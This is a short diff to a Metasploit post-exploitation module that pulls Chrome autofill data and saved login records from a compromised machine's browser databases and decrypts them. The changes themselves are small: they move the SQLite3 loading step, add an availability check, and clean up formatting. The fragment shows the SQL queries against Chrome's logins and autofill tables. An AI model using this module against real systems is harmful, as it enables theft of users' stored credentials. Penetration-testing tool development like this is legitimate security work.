@@ -73,12 +73,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	def process_files(username)
-		begin
-			require 'sqlite3'
-		rescue ::Exception => e
-			print_error(e)
-			return
-		end
 		secrets = ""
 		decrypt_table = Rex::Ui::Text::Table.new(
 			"Header"  => "Decrypted data",
@@ -193,7 +187,7 @@ class Metasploit3 < Msf::Post
 		return true
 	end
 
-	def run		
+	def run
 		@chrome_files = [
 			{ :raw => "", :in_file => "Web Data", :sql => "select * from autofill;"},
 			{ :raw => "", :in_file => "Web Data", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;"},
@@ -244,11 +238,20 @@ class Metasploit3 < Msf::Post
 			prepare_railgun
 		end
 
+
+		has_sqlite3 = true
+		begin
+			require 'sqlite3'
+		rescue
+			print_error("SQLite3 is not available, and we are not able to parse the database.")
+			has_sqlite3 = false
+		end
+
 		#Process files for each username
 		usernames.each do |u|
-			print_status("extracting data for user '#{u}'...")
+			print_status("Extracting data for user '#{u}'...")
 			success = extract_data(u)
-			process_files(u) if success
+			process_files(u) if success and has_sqlite3
 		end
 
 		# Migrate back to the original process
